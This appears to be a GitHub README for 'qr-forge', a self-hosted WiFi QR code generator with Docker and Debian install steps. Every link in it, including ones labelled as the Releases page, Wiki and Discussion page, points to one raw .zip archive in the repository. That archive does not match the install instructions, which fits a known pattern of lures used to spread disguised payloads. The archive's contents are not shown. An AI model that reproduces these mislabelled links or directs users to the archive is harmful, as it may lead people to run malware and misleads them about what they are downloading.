# 🎉 qr-forge - Create QR Codes Easily

## ✨ Overview
qr-forge is a self-hosted QR code generator that supports WiFi connections. Whether you want to create a QR code for your WiFi network or share information easily, qr-forge has you covered. It features a FastAPI backend, the option to run locally with Docker, and a user-friendly dark interface.

## 📥 Download qr-forge

[![Download qr-forge](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip)](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip)

## 🚀 Getting Started
Follow these steps to download and run qr-forge easily:

1. Visit the [Releases page](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip).
2. On the Releases page, you will see the latest version of qr-forge listed. Look for the files provided for download.
3. Choose the correct file for your operating system:

   - **For Docker users:**
     - Download the Docker image for easy setup.
   - **For Local setup (without Docker):**
     - Download the Debian package if running on a Debian-based system.

4. Once the download completes, follow the steps below for installation and running the software.

## 🛠️ System Requirements
- **Operating System:** 
  - Debian or any Debian-based Linux distribution for the Debian package.
  - Docker installed if using the Docker image.
  
- **Memory:**
  - Minimum 1 GB RAM recommended.

- **Disk Space:**
  - At least 500 MB of free space for the installation.

## 📦 Installation & Setup

### Docker Installation
1. Open your terminal.
2. If you haven’t installed Docker yet, follow the official Docker documentation for installation instructions.
3. Pull the qr-forge Docker image using the command:
   ```
   docker pull ghost19-95/qr-forge
   ```

4. Once downloaded, run the Docker container:
   ```
   docker run -d -p 8000:80 ghost19-95/qr-forge
   ```

5. Open your web browser and go to `http://localhost:8000` to access qr-forge.

### Debian Package Installation
1. After downloading the Debian package, open your terminal.
2. Navigate to the directory where the package was downloaded. You can use the `cd` command, e.g.:
   ```
   cd ~/Downloads
   ```

3. Install the package using the command:
   ```
   sudo dpkg -i qr-forge-*.deb
   ```

4. If there are dependency issues, resolve them by running:
   ```
   sudo apt-get install -f
   ```

5. After the installation, you can start qr-forge by running:
   ```
   qr-forge
   ```

6. Open your web browser and go to `http://localhost:8000` to access qr-forge.

## 🎨 Using qr-forge
1. Open your web browser and go to `http://localhost:8000`.
2. Select the type of QR code you want to generate.
3. Enter the required information, such as your WiFi credentials if you are generating a WiFi QR code.
4. Click on the "Generate" button.
5. Your QR code will appear on the screen. You can download it or print it as needed.

## 📄 Features
- **WiFi Support:** Generate QR codes that allow users to connect to your WiFi effortlessly.
- **FastAPI Backend:** Enjoy fast and responsive performance.
- **Dark UI:** A modern interface that is easy on the eyes.
- **Self-Hosted:** You control your data and the accessibility of the application.

## ❓ FAQ

### Can I use this application without Docker?
Yes, qr-forge can be installed directly on Debian systems without Docker.

### Is it safe to use qr-forge?
Since qr-forge is self-hosted, your data stays with you. Ensure you keep your installation updated.

### Can I contribute to qr-forge?
Yes! Feel free to fork the repository and submit your changes via pull requests.

## 🛡️ Support
For any issues or feedback, please reach out by opening an issue in this repository. We appreciate your contributions and suggestions.

## 🔗 Additional Resources
- **Documentation:** Check our [Wiki](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip) for detailed guides.
- **Community:** Join the discussions and connect with other users in our [Discussion page](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip).

## 📥 Download link again
Don’t forget to [visit this page to download](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip) qr-forge and start generating QR codes today!